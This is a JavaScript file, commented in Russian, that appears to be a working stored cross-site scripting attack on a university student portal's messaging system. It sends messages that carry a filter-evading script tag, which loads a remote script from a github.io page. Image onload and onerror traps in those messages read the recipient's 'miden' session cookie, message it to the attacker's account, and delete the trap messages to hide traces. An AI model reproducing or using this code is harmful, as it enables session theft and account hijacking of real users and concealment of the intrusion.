const MESSAGE_LINK = 'https://lk.sut.ru/cabinet/project/cabinet/forms/message.php';
const MESSAGE_LINK_2 = 'https://lk.sut.ru/cabinet/project/cabinet/forms/sendto2.php';
// Шаблон данных idinfo=0&item=0&title=&mes_otvet=test&adresat=97130&saveotv;
const SCRIPT_LINK = 'https://thealexgo.github.io/forHTML_Academy/js/script.js';
const IMAGE_SRC = '1';

const userID = 97130;
const genData = (title, message) => `idinfo=0&item=0&title=${title}&mes_otvet=${message}&adresat=${userID}&saveotv`;
// Данные, которые нужны для удаления сообщения с ловушкой
const DATA_FOR_DELETE = (miden) => genData(`<img src=${IMAGE_SRC} height=0 onerror=jQuery(this).parent().parent().remove();gead(this)>`, miden);


function set_Cookie(name, value, expires, path, domain, secure) {
    // Установка cookie
    var curCookie = name + "=" + escape(value) +
        ((expires) ? "; expires=" + expires.toGMTString() : "") +
        ((path) ? "; path=" + path : "") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
        document.cookie = curCookie;
}

function getCookie(name) {
    // Получение cookie
    var prefix = name + "="
    var cookieStartIndex = document.cookie.indexOf(prefix)
    if (cookieStartIndex == -1)
            return null
    var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length)
    if (cookieEndIndex == -1)
            cookieEndIndex = document.cookie.length
    return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
}

function getMiden(id, str_t, str_d){
    // Отправляет сообщение с ловушкой получения miden
    $.post(MESSAGE_LINK, 'idinfo=0&title=<scrip<scriptt src="'+SCRIPT_LINK+'" async></script>'+str_t+'&mes='+str_d+'<br><img src=https://pm1.narvii.com/7222/e111e7e7fc0519c97af53ec2f883bf2a358af1c2r1-700-998v2_hq.jpg onload=sendMiden() height=0>&adresat='+id)
}

function sendMiden(){
    // Получает cookie и отправляет miden
    const miden = getCookie('miden');
    $.post(MESSAGE_LINK, DATA_FOR_DELETE(miden));
}

function delMsg(id){
    // Удаляет сообщение по id
    $.post(MESSAGE_LINK, `id_del[]=${id}&delmes=2`)
}

function get_n_clear(id){
    // Читает сообщение id и сразу его удаляет
    let a = $.post(MESSAGE_LINK_2, data="id="+id+"&prosmotr")
    setTimeout(function() { console.log($(JSON.parse(a.responseText))[0].annotation); delMsg(id) }, 1000)
}

function gead(el) {
    console.log(el);
    const wrapper = el.parentElement.parentElement;
    wrapper.style.display = 'none';
    console.log(wrapper);
    delMsg(wrapper.id.replace('tr_',''));
}
